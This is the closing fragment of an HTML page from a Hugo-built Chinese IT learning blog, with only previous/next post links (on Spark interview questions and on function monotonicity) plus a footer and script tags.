			<p class="pager__title">2020年最新Spark企业级面试题【上】</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/74dbe72479bbf5a8610f245c214ea46a/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">函数的单调性和曲线的凹凸性</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>